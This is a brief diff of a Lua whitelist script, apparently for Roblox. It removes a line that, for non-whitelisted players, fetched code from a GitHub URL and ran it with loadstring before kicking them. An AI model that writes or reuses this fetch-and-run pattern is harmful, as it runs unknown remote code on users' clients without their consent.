@@ -17,7 +17,6 @@ local lilboy = {
     
     -- Check if the LocalPlayer is whitelisted
     if game.Players.LocalPlayer and not isPlayerWhitelisted(game.Players.LocalPlayer) then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/pathywathy/path/main/l"))()
         game.Players.LocalPlayer:Kick("You are not whitelisted. talk to pathw/path#0911 for whitelist")
     else
     print("whitelisted.")
